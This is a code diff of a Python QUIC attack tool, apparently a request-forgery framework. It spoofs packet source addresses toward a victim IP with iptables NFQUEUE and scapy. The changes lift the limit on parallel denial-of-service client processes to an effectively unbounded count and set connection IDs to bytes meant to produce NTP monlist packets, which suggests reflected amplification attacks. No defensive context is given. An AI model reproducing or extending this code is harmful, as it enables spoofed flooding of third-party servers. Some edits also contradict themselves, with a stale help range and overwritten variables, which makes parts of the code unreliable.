@@ -34,14 +34,12 @@ import vnrf_payload_dns as vp_dns
 
 
 banner = '''
-   ____  _    _ _____ _____ ______
-  / __ \| |  | |_   _/ ____|  ____|
- | |  | | |  | | | || |    | |__ ___  _ __ __ _  ___
- | |  | | |  | | | || |    |  __/ _ \| '__/ _` |/ _ \\
- | |__| | |__| |_| || |____| | | (_) | | | (_| |  __/
-  \___\_\\\\____/|_____\_____|_|  \___/|_|  \__, |\___|
-                                           __/ |
-                                          |___/
+  ___  _   _ ___ ____     _   _ _____ ____  
+ / _ \| | | |_ _/ ___|   | \ | |_   _|  _ \ 
+| | | | | | || | |       |  \| | | | | |_) |
+| |_| | |_| || | |___    | |\  | | | |  __/ 
+ \__\_\\___/|___\____|___|_| \_| |_| |_|    
+                    |_____|                 
 '''
 
 SPOOFED_COUNT = 0
@@ -50,10 +48,10 @@ PACKET_COUNT = 0
 # Iptables Templates
 iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"
 
-# Legacy Lsquic and quicly support, adjust to the correct install path
-lsquic_client_tmpl = "/home/client/quic/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/client/quic/QUICforge/secrets -p {path} -K"
-lsquic_client_flag_version = " -o version={version}"    # Set QUIC version
-lsquic_client_flag_alpn = " -Q {alpn}"                  # Set ALPN
+# # Legacy Lsquic and quicly support, adjust to the correct install path
+# lsquic_client_tmpl = "/home/client/quic/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/client/quic/QUICforge/secrets -p {path} -K"
+# lsquic_client_flag_version = " -o version={version}"    # Set QUIC version
+# lsquic_client_flag_alpn = " -Q {alpn}"                  # Set ALPN
 
 quicly_client_tmpl = "/home/client/quic/quicly/quicly/cli {victim_ip} {victim_port} -O -p {path} -a {alpn}"
 
@@ -72,7 +70,7 @@ def parse_arguments():
     optparser.add_argument('--target_port','-t', help='The target\'s listening port', default=0, type=int)
     optparser.add_argument('--path','-p', help='The path to request for http requests', default="/")
     optparser.add_argument('--alpn','-a', help='The ALPN to be used. Defaults are h3-29 for draft-29 and h3 for version 1', default='h3')
-    optparser.add_argument('--dos', '-d', help='Number of client processes to be started', type=int, default=1, choices=range(1,21), metavar="[1-22]")
+    optparser.add_argument('--dos', '-d', help='Number of client processes to be started', type=int, default=1, choices=range(1,100000000000000), metavar="[1-22]")
     #optparser.add_argument('--verbose','-v', help='Turn on stdout and stderr for client subprocesses', action='store_true')
 
     subparsers = parser.add_subparsers(required=True, dest='mode')
@@ -95,20 +93,12 @@ def parse_arguments():
     parser_vn._optionals.title = 'Optional Arguments'
     parser_vn._positionals.title = 'Required Arguments'
 
-    #Parser for SIRF
-    parser_si = subparsers.add_parser('si', help='Server initial mode', parents=[optparser], description=gen_desc + '\nServer Initial Mode', formatter_class=RawTextHelpFormatter)
-    parser_si.add_argument('--legacy', '-e', help='Enables legacy mode with the client specified', default=False, choices=['lsquic', 'quicly'])
-    parser_si.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
-    parser_si.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
-    parser_si._optionals.title = 'Optional Arguments'
-    parser_si._positionals.title = 'Required Arguments'
-
     return parser.parse_args()
 
 
 def spoof_packet(packet, ip, port=0):
     
-    payload = IP(packet.get_payload())
+    payload = scapy.all.IP(packet.get_payload())
         
     # Set spoofed source address
     old_ip = payload.src
@@ -119,8 +109,8 @@ def spoof_packet(packet, ip, port=0):
         payload.sport = port
 
     # Recalculate checksums for IP and UDP
-    del payload[IP].chksum
-    del payload[UDP].chksum
+    del payload[scapy.all.IP].chksum
+    del payload[scapy.all.UDP].chksum
     payload = payload.__class__(bytes(payload))
     packet.set_payload(bytes(payload))
     print("[*] {old_ip}:{old_port} -> {ip}:{port}".format(old_ip=old_ip, old_port=old_port, ip=ip, port=(port if port !=0 else old_port)))
@@ -144,11 +134,6 @@ def connection_migration_callback(packet, starttime=0, args=None):
         if args.limit != 0:
             SPOOFED_COUNT += 1
 
-    #if time.time()-starttime > args.start_time:
-    #    packet = spoof_packet(packet, args.target_ip, args.target_port)
-    #    if args.limit != 0:
-    #        SPOOFED_COUNT += 1
-
     packet.accept()
     
 
@@ -165,18 +150,7 @@ def version_negotiation_callback(packet, args=None):
     packet.accept()
     
 
-def server_initial_callback(packet, args=None):
-    global SPOOFED_COUNT
-    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
-        packet.drop()
-        return
-
-    packet = spoof_packet(packet, args.target_ip, args.target_port)
-    if args.limit != 0:
-        SPOOFED_COUNT += 1
-
-    packet.accept()
-
+# Major changes made here
 
 def configure_client(args):
     if args.path[0] != "/":
@@ -185,13 +159,18 @@ def configure_client(args):
     version = 'VNRF' if args.mode == "vn" else "VERSION_1"
     cid_len = args.cid_len if "cid_len" in args else 20
 
-    #init_dcid = b"A" * cid_len
-    #init_scid = b"B" * cid_len
-    init_dcid = os.urandom(cid_len)
-    init_scid = os.urandom(cid_len)
+    # Setting DCID for generating Monlist NTP packets
+    init_dcid = b'\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00'
+    init_scid = b'\x00\x03\x2a\x00\x00\x00'
+    
     if args.mode == 'vn' and args.payload_mode != None:
-        if args.payload_mode == "dns":
-            init_dcid,init_scid = vp_dns.create_payload(args.payload)
+         if args.payload_mode == "dns":
+                 init_dcid = b"A" * cid_len
+                 init_scid = b"B" * cid_len
+                 init_scid = os.urandom(cid_len)
+                 init_dcid = os.urandom(cid_len)
+                 init_dcid,init_scid = vp_dns.create_payload(args.payload)
+                 
 
     configuration = QuicConfiguration(
         is_client=True, 
@@ -207,21 +186,7 @@ def configure_client(args):
     return url, configuration
 
 
-def configure_legacy_client(args):
-    
-    cmd = ""
-    if args.legacy == 'lsquic':
-        cmd = lsquic_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, host=args.host, path=args.path)
-        if args.version and args.version != '1':
-            cmd += lsquic_client_flag_version.format(version=args.version)     
-        if args.alpn and args.alpn != 'h3':
-            cmd += lsquic_client_flag_alpn.format(alpn=args.alpn)
-    
-    if args.legacy == 'quicly':
-        cmd = quicly_client_tmpl.format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path, alpn=args.alpn)
-    
-    print(cmd)
-    return cmd
+
 
 
 def main():
